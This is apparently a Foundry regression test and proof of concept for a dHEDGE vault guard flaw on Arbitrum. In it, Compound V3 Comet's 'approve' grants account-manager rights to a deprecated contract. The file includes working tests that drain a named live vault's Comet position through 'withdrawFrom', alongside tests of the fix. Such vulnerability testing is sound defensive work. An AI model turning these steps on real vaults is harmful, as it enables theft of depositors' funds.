// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;

import {Governance} from "contracts/Governance.sol";
import {PoolLogic} from "contracts/PoolLogic.sol";
import {PoolManagerLogic} from "contracts/PoolManagerLogic.sol";
import {CompoundV3CometAssetGuard} from "contracts/guards/assetGuards/CompoundV3CometAssetGuard.sol";
import {ICompoundV3Comet} from "contracts/interfaces/compound/ICompoundV3Comet.sol";
import {IAssetGuard} from "contracts/interfaces/guards/IAssetGuard.sol";
import {IERC20} from "contracts/interfaces/IERC20.sol";
import {ArbitrumConfig} from "test/integration/utils/foundry/config/ArbitrumConfig.sol";
import {DeploymentDryRunArbitrum} from "test/integration/utils/foundry/dryRun/DeploymentDryRunArbitrum.t.sol";

/// @dev The part of Comet's surface that `ICompoundV3Comet` omits, because dHEDGE never intends to call it.
///      `approve(spender, amount)` on a Comet is NOT an ERC20 allowance: `amount` may only be 0 or
///      `type(uint256).max`, and it toggles account-manager permission rather than setting an allowance.
///      See CometExt.approve / CometExt.allowance in the deployed extension delegate
///      (Arbitrum: 0x95DeDD64b551F05E9f59a101a519B024b6b116E7).
interface IComet {
  function approve(address spender, uint256 amount) external returns (bool);

  function withdrawFrom(address src, address to, address asset, uint256 amount) external;

  function allowance(address owner, address spender) external view returns (uint256);

  function isAllowed(address owner, address accountManager) external view returns (bool);

  function balanceOf(address account) external view returns (uint256);
}

/// @notice Same root cause as `UniswapV3PositionApprovalTest`, different and worse consequence.
///         `CompoundV3CometContractGuard.txGuard` only handles `supply` and `withdraw`, so an `approve` call
///         returns transaction type 0 and `PoolLogicLib` retries it against the asset guard. Because
///         `CompoundV3CometAssetGuard` inherits `ERC20Guard`, the retry authorises `approve` for any spender
///         with a non-zero contract guard - which includes contracts deprecated via `ClosedContractGuard`.
///         Comet reuses the ERC20 `approve` selector for permission management rather than allowances, so what
///         the vault actually grants is account-manager rights: the spender can then call `withdrawFrom`,
///         `supplyFrom` and `transferAssetFrom` on the vault's behalf.
///         Everything here runs against unmodified state at the pinned fork block - the Comet asset guard, the
///         Comet contract guard and the deprecated spender's `ClosedContractGuard` were all registered on
///         Arbitrum at that block. Mainnet has since been migrated to the fixed asset guard.
contract CompoundV3CometApprovalTest is DeploymentDryRunArbitrum {
  /// @dev Live vault holding a ~$382k cUSDCv3 supply position out of ~$758k total at the fork block.
  address internal constant VICTIM_VAULT = 0xE48F22822e0FB60BCA2Bb126ba71efE3fBAa4063;

  IComet internal constant cUSDC = IComet(0x9c4ec768c28520B50860ea7a15bd7213a9fF58bf);

  /// @dev Deprecated on Arbitrum (config/arbitrum/dHEDGE Deprecated Contract Guards.csv), i.e. stubbed to
  ///      `ClosedContractGuard`. Stands in for "dHEDGE no longer trusts this contract, but its guard address
  ///      is still non-zero" - which is all `ERC20Guard`'s approve check tests for.
  address internal deprecatedSpender = ArbitrumConfig.UNISWAP_V3_ROUTER;

  PoolManagerLogic internal poolManagerLogic;
  address internal manager;
  address internal attacker;

  constructor() DeploymentDryRunArbitrum(488731014, new address[](0)) {}

  function setUp() public override {
    super.setUp();

    poolManagerLogic = PoolManagerLogic(PoolLogic(VICTIM_VAULT).poolManagerLogic());
    manager = poolManagerLogic.manager();
    attacker = makeAddr("attacker");

    assertGt(cUSDC.balanceOf(VICTIM_VAULT), 0, "vault holds no Comet position");
    assertTrue(poolManagerLogic.isSupportedAsset(address(cUSDC)), "Comet not enabled");
    // The Comet has a contract guard that rejects `approve`, and an asset guard that does not.
    assertTrue(poolFactory.getContractGuard(address(cUSDC)) != address(0));
    assertTrue(poolFactory.getAssetGuard(address(cUSDC)) != address(0));
    // The deprecated spender keeps a non-zero guard forever: Governance.setContractGuard refuses address(0).
    assertTrue(poolFactory.getContractGuard(deprecatedSpender) != address(0));
  }

  /// @dev Establishes that Comet's `approve` is a permission toggle, not an allowance.
  function test_comet_approve_is_a_permission_toggle_not_an_allowance() public {
    vm.startPrank(attacker);

    // Any amount other than 0 or max is rejected outright - the second argument is not an amount.
    vm.expectRevert(abi.encodeWithSignature("BadAmount()"));
    cUSDC.approve(deprecatedSpender, 1);

    // Max grants account-manager rights; allowance() then reports max regardless of any balance.
    cUSDC.approve(deprecatedSpender, type(uint256).max);
    assertTrue(cUSDC.isAllowed(attacker, deprecatedSpender), "approve did not grant permission");
    assertEq(cUSDC.allowance(attacker, deprecatedSpender), type(uint256).max);

    // Zero revokes them.
    cUSDC.approve(deprecatedSpender, 0);
    assertFalse(cUSDC.isAllowed(attacker, deprecatedSpender), "approve did not revoke permission");

    vm.stopPrank();
  }

  function test_manager_can_grant_comet_account_manager_rights_to_deprecated_contract() public {
    assertFalse(cUSDC.isAllowed(VICTIM_VAULT, deprecatedSpender), "already permitted");

    _approveCometAsManager();

    assertTrue(cUSDC.isAllowed(VICTIM_VAULT, deprecatedSpender), "account manager rights not granted");
    assertEq(cUSDC.allowance(VICTIM_VAULT, deprecatedSpender), type(uint256).max);
  }

  /// @dev Demonstrates the capability the grant confers. NOTE: this is not a permissionless end-to-end theft -
  ///      it requires the approved spender itself to make this call, and no currently whitelisted contract can
  ///      be induced to call Comet with attacker-chosen arguments. The grant is unconditional though, so the
  ///      position is one arbitrary-call sink away from being drainable.
  function test_granted_account_manager_can_drain_the_whole_comet_position() public {
    _approveCometAsManager();

    uint256 positionSize = cUSDC.balanceOf(VICTIM_VAULT);
    uint256 fundValueBefore = poolManagerLogic.totalFundValue();
    uint256 stolenValue = poolManagerLogic.assetValue(address(cUSDC), positionSize);

    vm.prank(deprecatedSpender);
    cUSDC.withdrawFrom(VICTIM_VAULT, attacker, usdc, positionSize);

    assertEq(cUSDC.balanceOf(VICTIM_VAULT), 0, "position not drained");
    assertEq(IERC20(usdc).balanceOf(attacker), positionSize, "attacker did not receive the base asset");
    assertApproxEqRel(poolManagerLogic.totalFundValue(), fundValueBefore - stolenValue, 0.001e18);
  }

  function test_revert_manager_cannot_grant_comet_account_manager_rights_after_fix() public {
    _deployFixedCometAssetGuard();

    // "dh23" - no guard authorised the transaction.
    vm.expectRevert(bytes("dh23"));
    _approveCometAsManager();
  }

  /// @dev The fixed guard overrides `txGuard`, so make sure the asset-guard side still works.
  function test_comet_asset_guard_intact_after_fix() public {
    CompoundV3CometAssetGuard fixedGuard = _deployFixedCometAssetGuard();

    uint256 positionSize = cUSDC.balanceOf(VICTIM_VAULT);
    assertEq(fixedGuard.getBalance(VICTIM_VAULT, address(cUSDC)), positionSize, "valuation changed");
    assertEq(fixedGuard.getDecimals(address(cUSDC)), 6);

    // Withdrawals still unroll the position by withdrawing the base token from the Comet.
    (address withdrawAsset, uint256 withdrawBalance, IAssetGuard.MultiTransaction[] memory transactions) = fixedGuard
      .withdrawProcessing(VICTIM_VAULT, address(cUSDC), 1e18 / 2, attacker);
    assertEq(withdrawAsset, usdc);
    assertEq(withdrawBalance, 0);
    assertEq(transactions.length, 1);
    assertEq(transactions[0].to, address(cUSDC));
    assertEq(
      transactions[0].txData,
      abi.encodeWithSelector(ICompoundV3Comet.withdraw.selector, usdc, positionSize / 2)
    );
  }

  /// @dev Legitimate Compound flows are unaffected: supplying needs an allowance on the base token,
  ///      which targets the token rather than the Comet, and withdrawing goes through the contract guard.
  function test_manager_can_still_supply_and_withdraw_after_fix() public {
    _deployFixedCometAssetGuard();

    vm.prank(manager);
    PoolLogic(VICTIM_VAULT).execTransaction(
      usdc,
      abi.encodeWithSelector(IComet.approve.selector, address(cUSDC), type(uint256).max)
    );
    assertEq(IERC20(usdc).allowance(VICTIM_VAULT, address(cUSDC)), type(uint256).max, "base token approval blocked");

    uint256 positionBefore = cUSDC.balanceOf(VICTIM_VAULT);

    vm.prank(manager);
    PoolLogic(VICTIM_VAULT).execTransaction(
      address(cUSDC),
      abi.encodeWithSelector(ICompoundV3Comet.withdraw.selector, usdc, positionBefore / 2)
    );

    assertApproxEqAbs(cUSDC.balanceOf(VICTIM_VAULT), positionBefore - positionBefore / 2, 10);
  }

  function _approveCometAsManager() internal {
    vm.prank(manager);
    PoolLogic(VICTIM_VAULT).execTransaction(
      address(cUSDC),
      abi.encodeWithSelector(IComet.approve.selector, deprecatedSpender, type(uint256).max)
    );
  }

  function _deployFixedCometAssetGuard() internal returns (CompoundV3CometAssetGuard fixedGuard) {
    fixedGuard = new CompoundV3CometAssetGuard();
    Governance governance = Governance(poolFactory.governanceAddress());
    uint16 assetType = poolFactory.getAssetType(address(cUSDC));

    vm.prank(governance.owner());
    governance.setAssetGuard(assetType, address(fixedGuard));
  }
}
